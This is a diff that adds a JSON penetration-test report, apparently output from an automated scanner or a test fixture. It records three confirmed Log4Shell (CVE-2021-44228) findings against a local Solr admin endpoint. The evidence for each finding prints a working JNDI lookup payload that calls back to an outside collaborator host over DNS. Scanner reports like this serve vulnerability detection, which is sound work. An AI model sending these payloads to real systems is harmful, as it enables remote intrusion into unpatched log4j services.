@@ -1,0 +1,132 @@
+{
+  "id": "5216167a-4726-4b08-a624-eb51b51489da",
+  "engagement_name": "Capability-recall B warm",
+  "target_scope": [
+    "localhost",
+    "127.0.0.1"
+  ],
+  "test_start": "2026-07-21T11:02:47.658010Z",
+  "test_end": "2026-07-21T11:02:47.658010Z",
+  "generated_at": "2026-07-21T11:02:47.658808Z",
+  "executive_summary": {
+    "overview": "Penetration test of localhost, 127.0.0.1. 3 findings identified.",
+    "risk_rating": "Critical",
+    "critical_count": 3,
+    "high_count": 0,
+    "medium_count": 0,
+    "low_count": 0,
+    "info_count": 0,
+    "key_findings": [],
+    "recommendations": []
+  },
+  "hosts": [],
+  "findings": [
+    {
+      "id": "7ee042e5-5cc9-498d-9b0d-bdabc5f33ab0",
+      "title": "Log4Shell RCE (CVE-2021-44228) via log-sink JNDI egress \u2014 action",
+      "description": "Technique: CVE-2021-44228 (Log4Shell) \u2014 JNDI message-lookup egress via a log sink. Parameter: action.",
+      "severity": "critical",
+      "status": "confirmed",
+      "target": "http://localhost:8983/solr/admin/cores",
+      "evidence": [
+        "Request: Log4Shell JNDI probe http://localhost:8983/solr/admin/cores \u2014 action=${jndi:dns://host.docker.internal:15353/xwkbrzyovbpa4kfs3aaccb2lgi}",
+        "Response: out-of-band JNDI/dns callback bearing the probe nonce received (dns from 127.0.0.1)",
+        "class=log_interpolation (log4j-core message-lookup JNDI egress); confirmation=P6 out-of-band callback (no in-band signal by design)",
+        "candidate_param=action verification=verified-oob",
+        "confirmation=P6 target=${jndi:dns://host.docker.internal:15353/xwkbrzyovbpa4kfs3aaccb2lgi} status=None",
+        "outbound_probe: GET http://localhost:8983/solr/admin/cores \u2014 action=${jndi:dns://host.docker.internal:15353/xwkbrzyovbpa4kfs3aaccb2lgi}",
+        "callback_nonce='xwkbrzyovbpa4kfs3aaccb2lgi' (carried only in the one outbound probe; control_bore_it=False)",
+        "confirming_excerpt: inbound callback: proto=dns src=127.0.0.1 host=xwkbrzyovbpa4kfs3aaccb2lgi path= received_at=1784631767.584",
+        "control [fresh single-use nonce minted but never sent to the target \u2014 the collaborator recorded no callback for it (proves the confirming callback is genuine inbound traffic, not a fabricated event)] status=None"
+      ],
+      "cvss_score": null,
+      "cve_ids": [],
+      "references": [],
+      "remediation": "",
+      "discovered_at": "2026-07-21T11:02:47.590619Z",
+      "validated_at": null,
+      "discovery_provenance": {
+        "technology_key": "log4j-core",
+        "observed_version": "2.14.1",
+        "sink_shape_id": "log4j.log_sink",
+        "primitive_class": "log_interpolation",
+        "primitive_id": "log_interpolation.log4j_jndi",
+        "confirmation_primitive": "P6",
+        "reachability_grade": "hypothesized",
+        "gating_config": "log4j2.formatMsgNoLookups"
+      }
+    },
+    {
+      "id": "80e55607-3265-46f2-8ed1-2521854142a4",
+      "title": "Log4Shell RCE (CVE-2021-44228) via log-sink JNDI egress \u2014 core",
+      "description": "Technique: CVE-2021-44228 (Log4Shell) \u2014 JNDI message-lookup egress via a log sink. Parameter: core.",
+      "severity": "critical",
+      "status": "confirmed",
+      "target": "http://localhost:8983/solr/admin/cores",
+      "evidence": [
+        "Request: Log4Shell JNDI probe http://localhost:8983/solr/admin/cores \u2014 core=${jndi:dns://host.docker.internal:15353/hteh4tkhtizb3uetx3ifvmrkmm}",
+        "Response: out-of-band JNDI/dns callback bearing the probe nonce received (dns from 127.0.0.1)",
+        "class=log_interpolation (log4j-core message-lookup JNDI egress); confirmation=P6 out-of-band callback (no in-band signal by design)",
+        "candidate_param=core verification=verified-oob",
+        "confirmation=P6 target=${jndi:dns://host.docker.internal:15353/hteh4tkhtizb3uetx3ifvmrkmm} status=None",
+        "outbound_probe: GET http://localhost:8983/solr/admin/cores \u2014 core=${jndi:dns://host.docker.internal:15353/hteh4tkhtizb3uetx3ifvmrkmm}",
+        "callback_nonce='hteh4tkhtizb3uetx3ifvmrkmm' (carried only in the one outbound probe; control_bore_it=False)",
+        "confirming_excerpt: inbound callback: proto=dns src=127.0.0.1 host=hteh4tkhtizb3uetx3ifvmrkmm path= received_at=1784631767.587",
+        "control [fresh single-use nonce minted but never sent to the target \u2014 the collaborator recorded no callback for it (proves the confirming callback is genuine inbound traffic, not a fabricated event)] status=None"
+      ],
+      "cvss_score": null,
+      "cve_ids": [],
+      "references": [],
+      "remediation": "",
+      "discovered_at": "2026-07-21T11:02:47.590866Z",
+      "validated_at": null,
+      "discovery_provenance": {
+        "technology_key": "log4j-core",
+        "observed_version": "2.14.1",
+        "sink_shape_id": "log4j.log_sink",
+        "primitive_class": "log_interpolation",
+        "primitive_id": "log_interpolation.log4j_jndi",
+        "confirmation_primitive": "P6",
+        "reachability_grade": "hypothesized",
+        "gating_config": "log4j2.formatMsgNoLookups"
+      }
+    },
+    {
+      "id": "1f868658-7533-47d9-9736-7c5f6bd8d321",
+      "title": "Log4Shell RCE (CVE-2021-44228) via log-sink JNDI egress \u2014 name",
+      "description": "Technique: CVE-2021-44228 (Log4Shell) \u2014 JNDI message-lookup egress via a log sink. Parameter: name.",
+      "severity": "critical",
+      "status": "confirmed",
+      "target": "http://localhost:8983/solr/admin/cores",
+      "evidence": [
+        "Request: Log4Shell JNDI probe http://localhost:8983/solr/admin/cores \u2014 name=${jndi:dns://host.docker.internal:15353/6el4d3gtbqyzeciqybg5uilms4}",
+        "Response: out-of-band JNDI/dns callback bearing the probe nonce received (dns from 127.0.0.1)",
+        "class=log_interpolation (log4j-core message-lookup JNDI egress); confirmation=P6 out-of-band callback (no in-band signal by design)",
+        "candidate_param=name verification=verified-oob",
+        "confirmation=P6 target=${jndi:dns://host.docker.internal:15353/6el4d3gtbqyzeciqybg5uilms4} status=None",
+        "outbound_probe: GET http://localhost:8983/solr/admin/cores \u2014 name=${jndi:dns://host.docker.internal:15353/6el4d3gtbqyzeciqybg5uilms4}",
+        "callback_nonce='6el4d3gtbqyzeciqybg5uilms4' (carried only in the one outbound probe; control_bore_it=False)",
+        "confirming_excerpt: inbound callback: proto=dns src=127.0.0.1 host=6el4d3gtbqyzeciqybg5uilms4 path= received_at=1784631767.590",
+        "control [fresh single-use nonce minted but never sent to the target \u2014 the collaborator recorded no callback for it (proves the confirming callback is genuine inbound traffic, not a fabricated event)] status=None"
+      ],
+      "cvss_score": null,
+      "cve_ids": [],
+      "references": [],
+      "remediation": "",
+      "discovered_at": "2026-07-21T11:02:47.590955Z",
+      "validated_at": null,
+      "discovery_provenance": {
+        "technology_key": "log4j-core",
+        "observed_version": "2.14.1",
+        "sink_shape_id": "log4j.log_sink",
+        "primitive_class": "log_interpolation",
+        "primitive_id": "log_interpolation.log4j_jndi",
+        "confirmation_primitive": "P6",
+        "reachability_grade": "hypothesized",
+        "gating_config": "log4j2.formatMsgNoLookups"
+      }
+    }
+  ],
+  "methodology": "",
+  "appendices": {}
+}
